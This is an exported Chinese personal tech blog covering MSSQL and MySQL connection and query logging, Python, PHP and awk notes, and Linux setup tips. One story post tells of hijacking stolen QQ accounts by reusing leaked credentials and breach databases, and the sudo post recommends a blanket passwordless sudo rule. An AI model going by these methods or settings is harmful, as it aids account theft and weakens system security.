mssql：import pymssql
这里小提一下，pyodbc也是可以连接的，至于有没有pdo的库，偶也不知道。</p>

<p><span style="color: #ff0000;">2.php的数据库连接</span>
mysql：
连接方法海了去了，pdo,odbc,mysql默认连接法子（不需要加扩展，一般用这个）。
<span style="color: #00B050;">mssql：</span>
在这里要分在win下和在linux下了，在win下很是方便：
可以sqlsrv,这个是微软官方提供的连接方式，在大多数dll啥失效后还能用，如：
http://www.php.net/manual/zh/book.sqlsrv.php</p>

<p>鄙人在codeigniter论坛找到一个利用方法，如：
https://github.com/EllisLab/CodeIgniter/tree/develop/system/database/drivers/sqlsrv
下载两个文件sqlsrv_driver.php，sqlsrv_result.php即可。
然后在入口文件包含核心文件之前包含上面两个文件。
配置方法：
http://stackoverflow.com/questions/19460025/how-do-i-connect-codeigniter-to-a-sql-server</p>

<p>PS:这个也是php标准拓展。
在win下也需要处理一系列php高版本后对mssql不再支持的问题，话说在php6后只支持pdo连接了。
在此之前可以用pdo和odbc，或者服务器开启了mssql模块的话，可以直接mssql_connect，但仍要在php.ini里改下extension配置即可。</p>

<p><span style="color: #00B050;">在linux下：</span>
不想提了，蛋都碎了。
在linux下做mssql连接，很重要的一点就是freetds,这玩意儿linux连接mssql必备。mssql是从sybase衍生出来的，有一些哥们做了一些sybase的linux下的连接库，这些连接库同时也能支持mssql，
我用的时候是0.9吧（0.8也可），在这时配置的版本需要弄成8.0,具体的我就不再详述，多查阅资料大家会恍然的。
安装完freetds后（可以下载安装包安装，也可以yum、apt-get源安装），
在这里提供一个下载链接：http://blog.csdn.net/kunp/article/details/387013</p>

<p>然后就是选择mssql_connect还是pdo还是odbc,暂时找到这几种方法，令人纠结心痛的是这几种方法似乎都要重新编译php，将环境啥配置啥的重新编译进去，由于鄙人找了半天确实没找到他说的php源代码安装目录下ext目录的mssql目录，然后去configure，所以这条路pass掉，其中需要phpize编译的步奏，也pass掉，鄙人perl环境出过问题，执行老出相关错误（明白怎么回事的大牛欢迎吐槽，偶是昏了）。所以意思是php扩展的连接库文件**.so等压根不能生成，也谈不上去php.ini里去改啥扩展配置路径，蛋碎一地。
怎么办呢？基友告诉我个法子，让我不装扩展，直接用php-mssql，鄙人centos6，yum了一下，坑比的没有安装包，直接被丢了一脸的链接：
https://gist.github.com/shf/2052432
通过这个方法我装上了php-mssql（需要代理），然后yum安装了php-odbc，然后，然后木有连上mssql，不知道咋回事，这个问题留着解决，猜测应该是还要做其他配置，完全是基友跟我瞎摸索有木有。。</p>

<p><span style="color: #00B050;">后记：此方法可行！不过需要关闭selinux，它拦截了端口！远程连接mysql相同，不止需要注意iptables！</span></p>

<p><span style="color: #00B050;">附上链接：http://blog.csdn.net/feng2375/article/details/7354045</span></p>

<p><span style="color: #00B050;">权限授予：http://blog.163.com/guotao_163/blog/static/2368282201010422031307/</span></p>

<p><span style="color: #00B050;">特殊模式改密码需注意：http://blog.csdn.net/hzw2312/article/details/8968806</span></p>

<p> </p>

<p><span style="color: #ff0000;">3.关于mssql开启远程</span>
大家知道如果要让外服务器访问，sqlserver必须开启远程，开启1433，在这里稍稍说下。
http://www.360doc.com/content/13/0525/23/19147_288191810.shtml
这篇文章介绍的比较全，但是偶的1433端口一直没开，telnet xx.xx.xx.xx 1433不上。</p>

<p>怎么办，如：
http://hi.baidu.com/daheshuiman/item/6dad61982dd267895814615d
把1433端口配上启用、活动。
记住sql-server browser必须打开。
在网上有说sqlserver2005 版本0.8以下的需要打补丁才开的了，也就说至少要打上sp3以上的补丁。
PS:在这里提下，我自己用时sql-server browser没有打开，按钮灰色，所以需要要把所有属性勾上活动，所有勾上是，这点特别注意。
开启了后一般就能看的1433能telnet上了。外连时，据网上说，可以直接用ip,还有说需要加sqlserver实例名，偶表示不明觉厉。</p>

<p>附上另两篇参考文章:
http://www.2cto.com/database/201304/204867.html
http://wenwen.sogou.com/z/q410734670.htm</p>

<p>最后，偶因为在linux环境下，无法连接mssql，只好退而求其次，连接mysql，但是原来的数据却是放在mssql里的，所以需要将数据转移：
https://github.com/Nick011/MSSQL-to-MySQL/blob/master/convert_db.py
在这里看到，在两个数据库都在开始开启了cursor后，在insert了才commit(),但是注意看最后，每一次循环都要commit一次，
说明连接时只连接一次的。好吧，这个好像弱爆了。。</p>

<p><span style="color: #00ffff;">最后，上面讲的很粗不是本人意愿啊！！！完全是因为实验时老爷机崩溃了，资料引用全部丢失，以上大部分凭记忆拼接，所以缺漏之处，</span>
<span style="color: #00ffff;"> 还请不吝赐教，感谢！’</span></p>

<p> </p>
]]></content>
      <categories>
        
          <category> data </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[SQL历史语句的追踪宝典]]></title>
      <url>/data/2014/04/20/sql-e5-8e-86-e5-8f-b2-e8-af-ad-e5-8f-a5-e7-9a-84-e8-bf-bd-e8-b8-aa-e5-ae-9d-e5-85-b8/</url>
      <content type="html"><![CDATA[<p>鄙人最近在进行一个小项目，前面的文章提到过，在这几天做到了数据库行为分析这块儿。</p>

<p>我们如果拿到历史语句，可以进行一个反黑阔的追踪，可以进行数据异常分析。查数据库历史语句时，我们还能顺带进行各种日志审计和监控记录，对于运维的朋友来说很有帮助。</p>

<p>那么，我们如何获得数据库的执行过的历史语句呢，能否自动将其导出？定时处理数据？或者能否做中间件将其过滤？</p>

<p>鄙人在这里将在这里做一个详细的讲解。</p>

<p><strong><span style="line-height: 1.6; color: #ff0000;">1.Mssql：</span></strong></p>

<p>mssql的历史语句的获取和处理着实让鄙人痛苦了一把，在网上曾找到以下几种方法。</p>

<p>（1）sql server profiler</p>

<p>（2）sqldiag</p>

<p>（3）log explorer</p>

<p>我们先来看第一个，这个是sql server自带的追踪分析工具（<span style="color: #33cccc;">单独下载的版本很挫，功能少，鄙人找了很久没找到好的</span>），图形化界面操作，可以选择性过滤，可以手动保存产生的trace内容。缺点：不能自动保存（<span style="color: #33cccc;">网上有人说可以计划任务启动再保存啥的，没找到方法</span>），耗资源（mssql套件通病），资源多了很不好看（也可以通过一定的方法过滤）。</p>

<p>至于第二个sqldiag，默认位置：C:\Program Files\Microsoft SQL Server\90\Tools\Binn\。网上说其在log目录能产生一个叫sqldiag.txt的文件，里面可以看到历史语句，估计是鄙人人品太挫了，表示没看见这个文件。找遍了所有的trc文件也没看见我要的结果。曾经找一个基友appleu0帮忙试验了下，他也仅仅是在关闭程序后才看到一个文件生成（<span style="color: #33cccc;">文件名是啥我忘了Orz..</span>），且这个程序好像最多能记录最后一百条的数据，很挫，虽然还是够轻量级。</p>

<p>最后看看第三个，log explorer。其中提供两个强大的工具：日志分析浏览，对象恢复。这里讲老实话，我自己试的时候没有用成功，因为我采用的是windows认证，在安装连接数据库时老出错，后来一怒就不用了，但听某基友讲这个还是蛮好用，不过也达不到我的要求。</p>

<p>朋友们可能要问，那我最后采用的方法是什么呢，难道比上面几个现成的工具都要好么？</p>

<p>没错，虽然不一定比上面几个都好，但绝对是最便捷的，最轻量级的，因为它没有借助任何第三方工具（<span style="color: #33cccc;">呕吐。。</span>），采用的是mssql的自带的追踪器trace（profiler的本质）。</p>

<p>如何创建一个trace？</p>

<p>1）执行存储过程sp_trace_create创建一个追踪器</p>

<p>2）执行存储过程sp_trace_setevent添加自己想订阅的事件以及最终结果集的列名</p>

<p>3）执行存储过程sp_trace_setfilter设置过滤器来对过滤产生数据</p>

<p>附上代码：</p>
<pre lang="sql">DECLARE @return_code INT;
 DECLARE @TraceID INT;
 DECLARE @maxfilesize BIGINT;
 DECLARE @Onset BIT;  --------弄了个bit型变量
 SET @Onset = 1; 	
 SET @maxfilesize = 200; ------（单位为M）弄了个大点的，一般不会增长太多，增长太多肯定出问题了，让他自动关闭！
 --step 1: create a new empty trace definition
 EXEC sp_trace_create
                 @traceid OUTPUT
                , @options = 2           -------文件大小达到顶峰时会自增到新文件
                , @tracefile = N'C:\demon\LongRunningQueries'  ---输出文件，后缀为trc
                , @maxfilesize = @maxfilesize
     , @stoptime =NULL
     , @filecount = 2;
 -- step 2: add the events and columns

 EXEC sp_trace_setevent
                 @traceid = @TraceID
                , @eventid = 12 -- SQL:BatchCompleted ：用于sql语句追踪。
                , @columnid = 1 -- TextData ：历史语句
                , @on = @Onset;--include this column in trace

 EXEC sp_trace_setevent
                 @traceid = @TraceID
                , @eventid = 12 -- SQL:BatchCompleted
                , @columnid = 13 --Duration
                , @on = @Onset;--include this column in trace
 EXEC sp_trace_setevent
                 @traceid = @TraceID
                , @eventid = 12 -- SQL:BatchCompleted
                , @columnid = 15 --EndTime
                , @on = @Onset;--include this column in trace        
 -- step 3: add duration filter
 DECLARE @DurationFilter BIGINT;
 SET @DurationFilter = 10000000; --duration in microseconds
 EXEC sp_trace_setfilter
                 @traceid = @TraceID
                , @columnid = 13
                , @logical_operator = 0 --AND
                , @comparison_operator = 5 -- less than or equal to|---妈蛋，tmd大于100000*还抓个蛋的语句
                , @value = @DurationFilter; --filter value
 SELECT @TraceID AS TraceID;</pre>
<p>原文分析在这儿:http://www.cnblogs.com/fzrain/p/3476434.html#commentform
文章作者还是值得肯定的，不过有几处没讲明，还有bug要报错，鄙人修修补补勉强可用了。</p>

<p>在原文里，还可以看到开关trace的语句，见其下文，根据需要进行开关即可。</p>

<p>参考资料：
http://blog.csdn.net/hb_gx/article/details/1745800 SQL Server Profiler 有关的几个存储过程和函数
http://technet.microsoft.com/zh-cn/library/ms186265%28v=sql.105%29.aspx 官方文档</p>

<p>什么？问我什么优势？上面引用的文章讲的很清楚了。
1）trace是语句执行，没有GUI界面，耗资源少。
2）随时开关，即时保存。
3）过滤灵活，不用三方。</p>

<p> </p>

<p><strong><span style="color: #ff0000;">2.Mysql:</span></strong></p>

<p>相较于mssql的历史语句获取，mysql要轻量得多，也简单的多，下面给大家附上方法。</p>

<p>若要获取mysql语句，不采用第三方工具的话（<span style="color: #00ffff;">事实上我不知道哪款三方可以用来获取这个的</span>），可以通过配置mysql.ini(linux下为my.cnf)，让他开启sql记录日志，</p>

<p>PS:开启后日志量会很大喔，跟mssql一样，可以使用脚本定时删除，至于脚本这里就不提供了，太简单了，与本文关系也不大。</p>

<p>网上的配置很多都不能用，估计是不同系统问题吧：
这里提供一份通用的配置（不一定管用）：</p>
<pre lang="sql">[mysqld]
log=/var/log/mysql_query.log
#日志的路径（这里最不靠谱，个人觉得导出到表里是最容易生效的）
----------------------------------------
general_log=1
#开启的选项
# 将日志记录到mysql的table中
log_output=TABLE
#(默认导出到文件)</pre>
<p> </p>

<p>可以将日志输出到表里，也可以输出到日志里，配置好了直接重启mysql即可，鄙人重启了计算机才管用，真心人品碉堡了。</p>

<p>表的位置：mysql.general_log，里面包含了sql用户名，语句执行日期，还有历史语句本身等等，还是比较全面的，不需要的时候就把日志开关关掉，自行清理。</p>

<p>查看开关是否开启的办法：</p>

<p> </p>

<p> </p>
<pre lang="sql">mysql@localhost.(none)&gt;show global variables like "%genera%";
+------------------+------------------------------+
| Variable_name | Value |
+------------------+------------------------------+
| general_log | OFF |
| general_log_file | /data1/mysql9999/etch171.log |
+------------------+------------------------------+
2 rows in set (0.00 sec)

mysql@localhost.(none)&gt;set global general_log=on;
Query OK, 0 rows affected (0.02 sec)

mysql@localhost.(none)&gt;set global general_log=off;
Query OK, 0 rows affected (0.00 sec)</pre>
<p>仔细研究下，朋友们都很容易懂得。</p>

<p><strong><span style="color: #ff0000;">3.其他数据库的语句获取：</span></strong></p>

<p>前面也提到了，鄙人人品也搓，人也懒，不大可能面面俱到，但总要给有兴趣的朋友一点提示不是，这不，给大家附上一份资料。</p>

<p><a href="http://www.itpub.net/tree/index_1/" target="_blank">oracle</a> 里有v$sql等视图来记录执行过的sql语句,<a href="http://www.itpub.net/tree/index_51/" target="_blank">db2</a>里有事件监控器,<a href="http://www.itpub.net/thread-1430388-1-1.html" target="_blank">sybase</a> 里有mon监控表来记录，另外，附上progresql的记录方法：</p>

<p> </p>

<p> </p>

<p> </p>
<pre lang="sql">digoal=# alter database digoal set log_min_duration_statement=0;
ALTER DATABASE
或者
digoal=# alter database digoal set log_statement='all';
ALTER DATABASE
-- 只记录下digoal数据库的所有SQL, 其他数据库则按系统默认的配置.
语法 : 
ALTER DATABASE name SET configuration_parameter { TO | = } { value | DEFAULT }
ALTER DATABASE name SET configuration_parameter FROM CURRENT
ALTER DATABASE name RESET configuration_parameter
ALTER DATABASE name RESET ALL
PostgreSQL的权限分级较多, 例如可以按角色配置权限, 也可以按数据库配置权限, 也可以按会话配置权限等等。</pre>

<p>把握历史记录，利用好日志搭建蜜罐神马的，不用多久,你就能升职加薪、当上总经理、出任CEO、迎娶白富美、走上人生巅峰,想想还有点小激动呢。^_^
这里还得感谢下该死的B哥，虽然这货挺可恶的，但确实帮了我不少忙。</p>

<p><span style="color: #00B050;"><strong>————–Enjoy yourself!——————</strong></span></p>
]]></content>
      <categories>
        
          <category> data </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[PYTHON学习札记（五）]]></title>
      <url>/tips/2014/04/20/python-e5-ad-a6-e4-b9-a0-e6-9c-ad-e8-ae-b0-ef-bc-88-e4-ba-94-ef-bc-89/</url>
      <content type="html"><![CDATA[<p><span style="color: #ff0000;">博主考虑了许久，因为前面写的札记都较为基础，所以以后记录的都以代码和简要说明为主，精简于型.</span></p>

<p>1.实现类似于字典–{1:’xx’,2,[‘zz’,’yy’]}的形式：</p>
<pre lang="python">from collections import defaultdict
d = defaultdict(lambda: [])
with open('data.txt', 'rb') as f:
    for line in f:
        key, value = line[:-1].split(",")
        d[key].append(value)
for k,v in d.iteritems():
    print k, v</pre>
<p>附上参考链接：http://www.cnblogs.com/herbert/archive/2013/01/09/2852843.html</p>
<pre lang="python">number_result = {}                                                              

for line in sys.stdin:                                                          
|   l_s = line.strip().split(' ')                                               
|   key, val = l_s[0], l_s[1]                                                   
|   if key in number_result:                                                    
|   |   #number_result[key].append(val)                                         
|   |   l = []                                                                  
|   |   l.extend(number_result[key])                                            
|   |   l.append(val)                                                           
|   |   number_result[key] = l                                                  
|   |   #number_result[key] = number_result[key].append(val)                    
|   |   #print val                                                              
|   else: number_result[key] = [val]</pre>
<p>字典亦可直接append，将value转为list。
上述亦可将dict转化为字符串，用表达式解决。（博主未亲测）</p>

<p>if key in number_result: == if number_result.has_key(key) == True:</p>

<p>2.py判断一个变量属性方法：直接type后打印。
PS: 上面的代码==&gt;
else: number_result[key] = [val]
直接把值赋为了列表属性，属性统一后面处理显得更加便捷。</p>

<p>3.如例子1：
lambda的匿名函数功能挺好用：
举个例子
一般的函数是这样:</p>

<p>def f(x):
return x+1</p>

<p>这样使用 print f(4)</p>

<p>用lambda的话，写成这样:
g = lambda x : x+1
这样使用 print g(4)</p>

<p> </p>

<p>4.python 链接外部数据库</p>

<p>MySQLdb  pymssql。</p>

<p> </p>

<p><span style="color: #ff0000;">————项目中，持续更新————-</span></p>

<p> </p>

<p> </p>
]]></content>
      <categories>
        
          <category> tips </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[PHP学习札记（四）]]></title>
      <url>/tips/2014/04/01/php-e5-ad-a6-e4-b9-a0-e6-9c-ad-e8-ae-b0-ef-bc-88-e5-9b-9b-ef-bc-89/</url>
      <content type="html"><![CDATA[<p>这一季的php札记是由鄙人做的的一个小项目，而引发的思考。由于项目未完，还会继续更新，既是一个给自己的笔记也是希望对大家有帮助。</p>

<p>1.推荐自动排版：
这个与php关联不大，主要是前端有用，for bootstrap。
https://www.easel.io/demo
http://easelapp.uservoice.com/knowledgebase/topics/23354-videos
http://www.bootcss.com/p/layoutit/</p>

<p>2.php.ini配置的问题：</p>

<p>date.timezone = “Asia/Shanghai”
解决Warning：date(): It is not safe to rely on the system’s timezone settings.</p>

<p>3.自身文件变量：
http://www.cnblogs.com/zcy_soft/archive/2010/10/16/1853239.html
PHP_SELF、 SCRIPT_NAME、 REQUEST_URI区别</p>

<p>4.Undefined index: submit in的错误处理
http://blog.sina.com.cn/s/blog_675b54b801016duj.html
主要解决变量未初始化，容错之类。</p>

<p><span style="color: #ff0000;">———————-待续—————————–</span></p>
]]></content>
      <categories>
        
          <category> tips </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[8位qq引发的争战]]></title>
      <url>/tips/2013/12/21/8-e4-bd-8dqq-e5-bc-95-e5-8f-91-e7-9a-84-e4-ba-89-e6-88-98/</url>
      <content type="html"><![CDATA[<p>没错，题目就是“争战”，不要纠结于我错字，因为这里确实有“争”字。</p>

<p>在这里讲一个小故事，大家可以当趣事来听，不必太过认真：</p>

<p>这里先介绍下，我们故事的主人翁—Y君，是某普通大学的大一学生，对网安知之甚少，属于菜的不能再菜，天天逛逛菜鸟xx网，看基础教程还得研究半天那种。
这段时间，Y君正迷上了逛某X联盟，成为大众水军的某一员。正当Y君在宿舍优哉游哉地上网时，qq消息闪了，Y君打开一看，原来是C哥，Y君半个师傅。“Hey，
小Y，在干嘛呢？”，C问道。Y君无奈的打字回到：“在找点资料和教程啊，晚点还要上高数呢，忒烦了。”</p>

<p>C回了个笑脸道：“别苦逼着个脸了，给你看个好东西。”，说着，便丢给Y君一段链接和文字。Y君点开一看，立马高兴坏了，原来某x联盟有个“大牛”发了个
装逼帖子，结果把箱子地址侧漏了，弱口令进去，其中还有几个8位qq。</p>

<p>各位看官看到这里估计要笑了，8位qq，也就是几十块的事，这小Y一看就是土鳖。可是事实上，小Y是一个并不富裕家庭的孩子，买qq号这种事对于没有啥零花钱
的他来说，显然是不太现实的。然而作为一名小菜，自然对这位能拿到这么多8位qq的“大牛”异常眼馋了。</p>

<p>小Y喜滋滋地去挑了两个8位qq，把密码敲进登陆器，发现不能登上去。“恩？居然不能登，又被人先下手了。。。”，Y君不满的嘟囔了两句，又去论坛翻了翻那个
帖子，找了个不起眼的8位qq拿来登陆。果不其然，登陆上了，不过信息好友怎么都被清空了呢？小Y疑惑地看了看，发现qq空间已被人改了，原号是女号，结果空间
内容确是一个男人发布的装逼说说。“我内个擦，盗了号还不改密码，明目张胆说是自己盗的，这人够脑残啊。”，小Y笑了笑，准备去密保中心改密码。突然，右下
角弹出了qq提示框：您的账号已在异地登陆，如不是您的操作，请尽快更改密码。小Y顿时绝倒，感情这装逼的不是那盗号的，是抢号的！</p>

<p>这时小Y可没打算客气了，赶紧打开腾讯安全中心准备改密码。结果如大家如大家所料，二代密保+手机绑定，感情他喵的不改密码是因为改不了！这下咋办。小Y边抢
登陆qq，边冥思苦想解决方法，网络另一头的黑阔也不甘示弱，一直在和小Y抢占阵地，并且还速度略胜小Y一筹，把qq网名和qq签名全改成了问候小Y母亲和女性亲人
的语言。这可把小Y气坏了，不过学校的网速坑爹又骂不过对方，再这样弄下去就是跟对方比耐性了，完全没有意义，小Y开始淫荡地寻找解决法子。
当然，小Y开始仅仅是想把这个8位QQ拿到手，咱们虽然有手机绑定，但也可以猜密保啊，猜中了一样可以把这坑爹货KO了。小Y本想找C哥帮忙，结果看到。。</p>

<p><span style="color: #00B050;">[自动回复] 您所呼叫的大神正在DOTA中，请稍后再拨。。。</span>
<span style="color: #00B050;"> 不再提醒</span></p>

<p>好吧，这个老屌丝，注定一生没妹子，小Y决定自己干。</p>

<p>首先百度了这个qq，虽然qq上的注册信息被删光了，但是原主人留在网络里的信息是不容易被抹灭的。</p>

<p>幸好，发现qq主人在某贴吧留下的求助帖，需求仙剑某版本激活码，看来还是个跟小Y有着同好的妹子，想想还有点小激动<del>^_^</del>。</p>

<p>进一步没有翻到神马重要的东西，虽然偶然到妹子在某漫画吧的讨论帖子，不过，好吧，小Y看到后一阵无语，这个。。G漫画小Y还是不怎么感冒的，作为屌丝，我们
的Y君还是一个正常的屌丝啊。顿时这个q原主人在Y君的形象由萌妹子变身为抠脚腐女。不管怎么说，百度google都只有这点信息了。</p>

<p>我们的Y君其实当时是个很纯洁的小孩，没玩过微博，自然也没想到去切入微博入手。在猜密保时试完收集到的信息也没过找回，差点就打算去申诉了。不过除了密码
确实没得到任何地域和个人信息相关，失败率略高啊，骚年。。。</p>

<p>纠结了许久，C哥终于回话了，原来是午觉去了。不过我们的小Y得上课去了（这里为我们可怜的学生党们默哀一下），把密码和信息丢给C哥，拍拍屁股上课去了。
等到小Y回来，已是晚上8点。“幸好哥英明神武，拿了瓶可乐贿赂学习委员才逃出来了，该死的晚自习！”，小Y愤愤道。打开笔记本，等上qq，发现C哥的头像在闪，
于是小Y忐忑不安地点开了。</p>

<p>你猜神奇的C哥最后化腐朽为神奇了麽？</p>

<p>可惜C哥也不是神，不过我们的C哥是个很勤快的孩子，平时喜欢积攒裤子，什么大裤子，小裤子，超短裤子。。。都没有。C哥有本地存数据库的习惯，当时还没流行
社工库，哪有现在那么便利！</p>

<p>我们的抠脚妹子的信息自然不可能在裤子里，你不会真把她当女黑阔了吧。但是抢号的那人却侧漏了。知道是哪里麽？聪明的孩纸已经想到了，是那个抢号的黑阔在空间
发布的信息，里面居然神奇的留下了HACKED BY Hxxx qq，我们的大C哥在裤子里查出了信息，组合了下密码就进去邮箱了（这里说明，进邮箱不容易被主人察觉，不会
出现异地登陆）。令小Y惊诧的是，这人居然还是黑X网的坛友，小Y好像依稀还见过他的ID。
等到快熄灯时小Y登上这位黑阔的qq，还是9位的，里面好友俱全，只绑了密保没手机绑定，花点时间估计能盗来。不过小Y这时却起了恻隐之心，看着一栏一栏的家人，
基友，甚至还有女神（虽然空间主人未对他开放。。），小Y最终还是没下手。“黑亦有道吧，”小Y安慰自己道。“至少我已经找到了我要的道路，不是麽？”</p>

<p>=========================
故事讲完了，有部分润色加工，但大部分是真是的。你问我Y君是谁？我会告诉你是***麽。</p>

<p>好吧，我们下次有缘再会。^_^</p>

<p><span style="color: #00B050;">===Enjoy yourself===</span></p>
]]></content>
      <categories>
        
          <category> tips </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[System篇小记(一)]]></title>
      <url>/system/2013/12/08/e7-b3-bb-e7-bb-9f-e6-9b-b4-e6-96-b0-e5-ae-89-e8-a3-85-e5-b0-8f-e8-ae-b0-e4-b8-80/</url>
      <content type="html"><![CDATA[<p>本篇没有什么特别的，只是记录一些小弟安装更新linux系统时一些小细节或容易出错的地方，希望对盆友们有些帮助，大牛飘过。</p>

<p><span style="color: #00B050;">1.</span>安装Kali时，注意在选是否采用镜像源时选YES，此时，可能会出点问题，但我们在更新完以后可以在/etc/apt/source.list
里添加更新源，由于小弟并没有找到特别好的更新源，在这里也就不提供了。</p>

<p><span style="color: #00B050;">2.</span>kali里不要安装scim(输入法),难用不说，还容易缺失文件。我用时apt-get update了数次，更新了几次源，无果，最后忍无可忍
直接rm scim*， 然后apt-get ibus ibus-pinyin. 这个需要在系统设置的首选项里启用，并且把汉语加入,完美解决。</p>

<p><span style="color: #00B050;">3.</span>virtualbox共享盘：在虚拟机设置里需启用共享盘，vbox是不支持直接拖放的，在win下需要做盘符映射，linux下直接看不到盘符，
在media下sf_开头的文件即是共享盘符，嫌打开麻烦弄个软链接到根目录或者home目录即可。</p>

<p><span style="color: #00B050;">4.</span>装完系统时少用upgrade,在系统装完后可执行一次update,一般就足够了。别问偶为啥，偶不会告诉你内核稍微出点问题，upgrade能把、
你辛辛苦苦装半天的东西以及各种配置删干净，update则少，不过还是少用为妙。</p>

<p><span style="color: #00B050;">5.</span>visudo，号称能纠错避免sudo瘫痪，这里简单说下，sudo瘫痪了又没有启用root账号的话只有用livecd或者grub恢复了，下面会讲到。
感觉它还是需要root权限，里面有个纠错选项，据说可以防止语法错误，但估计是偶太笨了，窃以为不是特管用。</p>

<p><span style="color: #00B050;">6.</span>sudoers ，这坑爹货需要root权限才能修改，还是只读文件。由于鄙人为了安全，平常喜欢sudo,想直接弄个空密码，试遍了网上各种方法，只总结了个
NOPASSWD，一个都不对，害的偶grub了好几次，机子差点完蛋。解决办法就是%sudo ALL=(ALL) NOPASSWD:ALL，重启（部分系统可以直接生效）
就OK了。</p>

<p><span style="color: #ff0000;"><span style="color: #00B050;">7.</span><span style="color: #ffff99;">   </span></span>/etc/sudoers，也就是sudo的配置文件瘫痪后，需要liveCD救场或者grub恢复。偶试过了两种，跟大家分享下。
<span style="color: #ff0000;">（1）.liveCD</span></p>

<p>用光盘开机,挂载你的硬盘,再把sudoers改回去,然后卸载硬盘，完工（中间仍会用到sudo命令)</p>

<p><span style="color: #ff0000;">(2) grub</span>
#shift进入grub,按e选中recovery模式</p>

<p>#选中root账号
<img src="http://static.oschina.net/uploads/space/2013/0103/013547_fOIK_569120.jpg" alt="" /></p>

<h1 id="chmod-666-devnull">chmod 666 /dev/null</h1>
<p>mount -o remount rw /</p>

<h1 id="nano-etcsudoers">nano /etc/sudoers</h1>
<p>恢复本文件内容并存盘。
KO!</p>

<p><span style="color: #ff0000;">=====Enjoy Yourself!====</span></p>

<p> </p>
]]></content>
      <categories>
        
          <category> system </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[PYTHON学习札记（四）]]></title>
      <url>/coding/2013/12/01/python-e5-ad-a6-e4-b9-a0-e6-9c-ad-e8-ae-b0-ef-bc-88-e5-9b-9b-ef-bc-89/</url>
      <content type="html"><![CDATA[<p>1.Python抓取页面中超链接(URL)的三中方法比较(HTMLParser、pyquery、正则表达式) 
2.Python提供了原始字符串，顾名思义，就是保留原始字符的意思，不对反斜杠及反斜杠后面的字符进行转义，声明原始字符串的方法是在字符串前面加上’r’或者’R’。
3.findall里面可以直接使用正则，不考虑转义？
4.re.X re.I 
5.?i ?:—&gt;匹配大小写<br />
6.Python中最常用的从键盘获取输入的函数是raw_input()和input()。最好使用前者，统一以字符串形式返回。
7.print打印输出可以’前面加编码
8.urlopen后只能进行一次read，第二次为str类型，open选项加上timeout
9.except错误类型最好统一Exception，以免意外错误。
10.Python 报错’ascii’ codec can’t decode byte 0xe5 in position 0: ordinal not in range(128)，尝试decode，如不能写入尝试encode成byte流。
11.Python抓取页面中超链接(URL)的3中方法比较(HTMLParser、pyquery、正则表达式)==&gt;http://www.myexception.cn/HTML-CSS/639814.html
12.python判断是否为空可用if xx is None或者if not xx,后者应用相对更广且效果更佳。
13.按行读取url读取去掉\n</p>
<pre lang="python">
for line in file.readlines():
    line=line.strip('\n')
</pre>
<p>14.对于urlsplit、urlparse、urlunparse的详细介绍：
http://www.cnblogs.com/huangcong/archive/2011/08/31/2160633.html
http://hi.baidu.com/springemp/item/64613c7457731517d0dcb3a7
15.获取网页状态码，需要requests模块http://www.oschina.net/code/snippet_862981_23032
16.local variable ‘xx’ referenced before assignment 需要全局
17.对于url不变，内容跳转的，也就是那种防扫描的，可以用urllib直接open,catch报错即可。
ex：http://segmentfault.com/q/1010000000095769 Nginx配置
18.urllib2.geturl() 可以拿到跳转后的最终页面，302？
19.如何获取网页状态码：</p>
<pre lang="python">
f=urllib.urlopen("xxxxxx") 
print f.getcode() 
==========================
import requests
def getStatusCode(url):
r = requests.get(url, allow_redirects = False)
return r.status_code #使用的requests库在2.7或者2.6好像是没有的
===========================
conn = httplib.HTTPConnection("192.168.1.212");      
#开始进行数据提交   同时也可以使用get进行      
conn.request(method="POST",url="/newsadd.asp?action=newnew",body=params,headers=headers);      
#返回处理后的数据      
response = conn.getresponse();      
#判断是否提交成功      
if response.status == 302:  
</pre>
<p>20.httplib request的用法, getresponse() 用以进行返回数据
21.get_header探测远程文件是否存在可能需要细看是否取空</p>

]]></content>
      <categories>
        
          <category> coding </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[IDC远程管理篇（一）]]></title>
      <url>/tips/2013/11/25/idc-e8-bf-9c-e7-a8-8b-e7-ae-a1-e7-90-86-e7-af-87-ef-bc-88-e4-b8-80-ef-bc-89/</url>
      <content type="html"><![CDATA[<p>1.文件传输：
curl -F password=@/本地路径/文件名 远程服务器                   #模拟form表单post上传
curl  -T /local/filename    ftp://user:passwd@hostname/path/
scp local_file remote_username@remote_ip:remote_folder      #可适当更改，灵活输入。
scp -r local_folder remote_username@remote_ip:remote_folder #远程目录复制
不同的Linux之间copy文件常用有3种方法：
第一种就是ftp，也就是其中一台Linux安装ftp Server，这样可以另外一台使用ftp的client程序来进行文件的copy。
第二种方法就是采用samba服务，类似Windows文件copy 的方式来操作，比较简洁方便。
第三种就是利用scp命令来进行文件复制。
2.日志总结：</p>

]]></content>
      <categories>
        
          <category> tips </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[数据处理脚本之awk篇]]></title>
      <url>/coding/2013/11/20/e6-95-b0-e6-8d-ae-e5-a4-84-e7-90-86-e8-84-9a-e6-9c-ac-e4-b9-8bawk-e7-af-87/</url>
      <content type="html"><![CDATA[<p>1.awk适用于多列匹配，如果匹配单独的字符串采用sed或许会更佳。</p>

<p>2.awk在正向匹配和反向匹配时，最好用采用“（）”包含来进行单独分割，以免报错。</p>

<p>3.注意对于某列的匹配“！~”和“~”分别正反匹配。</p>

<table>
  <tbody>
    <tr>
      <td>4.如果“，”不能分割匹配项或者报错，可根据效用选用“</td>
      <td> </td>
      <td>”以及“&amp;&amp;”进行连接。</td>
    </tr>
  </tbody>
</table>

<p>5.正则[]要用//包含，不然报错。</p>

<p>6.Tab键产生的空格并非默认，需要”/t”。</p>

<p>7.^[]匹配的为否定中括号内的所以内容。而[^*]则是否定括号内任意。</p>

<p>8./^123$/,完整匹配“123”字符。</p>

<p>9.记住特殊字符，出错检查是否应该用“\”转义。</p>

